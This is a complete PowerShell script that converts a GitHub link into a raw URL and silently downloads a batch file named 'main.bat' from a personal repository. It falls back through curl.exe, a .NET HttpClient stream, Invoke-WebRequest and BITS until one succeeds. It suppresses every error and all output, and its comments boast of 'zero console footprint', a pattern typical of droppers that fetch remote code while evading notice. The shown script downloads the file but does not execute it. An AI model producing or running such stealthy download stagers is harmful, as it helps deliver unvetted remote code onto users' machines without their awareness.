$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$url = 'https://github.com/DevJeffersonL/MAS/blob/5cef103b7d33f4588e70511977c80add0805568d/main.bat'
$rawUrl = $url -replace 'github\.com/(.+?)/blob/', 'raw.githubusercontent.com/$1/'
$outFile = Join-Path $PWD (($rawUrl -split '/')[-1] -replace '\?.*$', '')

$done = $false

# Tier 1: curl.exe (Silent mode, all output redirected to null)
if (-not $done -and (Get-Command 'curl.exe' -ErrorAction SilentlyContinue)) {
    try {
        & curl.exe -sL --fail "$rawUrl" -o "$outFile" *>$null
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $outFile) -and ((Get-Item -LiteralPath $outFile).Length -gt 0)) {
            $done = $true
        }
    } catch {}
}

# Tier 2: Direct .NET stream (Zero console footprint)
if (-not $done) {
    try {
        if (Test-Path -LiteralPath $outFile) { Remove-Item -LiteralPath $outFile -Force *>$null }
        $client = [System.Net.Http.HttpClient]::new()
        $stream = $client.GetStreamAsync([System.Uri]$rawUrl).GetAwaiter().GetResult()
        $fs = [System.IO.File]::Create($outFile)
        $stream.CopyTo($fs)
        $fs.Dispose()
        $stream.Dispose()
        $client.Dispose()
        if ((Test-Path -LiteralPath $outFile) -and ((Get-Item -LiteralPath $outFile).Length -gt 0)) {
            $done = $true
        }
    } catch {}
}

# Tier 3: Invoke-WebRequest (Silenced)
if (-not $done) {
    try {
        if (Test-Path -LiteralPath $outFile) { Remove-Item -LiteralPath $outFile -Force *>$null }
        Invoke-WebRequest -Uri $rawUrl -OutFile $outFile -UseBasicParsing *>$null
        if ((Test-Path -LiteralPath $outFile) -and ((Get-Item -LiteralPath $outFile).Length -gt 0)) {
            $done = $true
        }
    } catch {}
}

# Tier 4: BITS (Silenced)
if (-not $done -and (Get-Command 'Start-BitsTransfer' -ErrorAction SilentlyContinue)) {
    try {
        if (Test-Path -LiteralPath $outFile) { Remove-Item -LiteralPath $outFile -Force *>$null }
        Start-BitsTransfer -Source $rawUrl -Destination $outFile -Priority High *>$null
        if ((Test-Path -LiteralPath $outFile) -and ((Get-Item -LiteralPath $outFile).Length -gt 0)) {
            $done = $true
        }
    } catch {}
}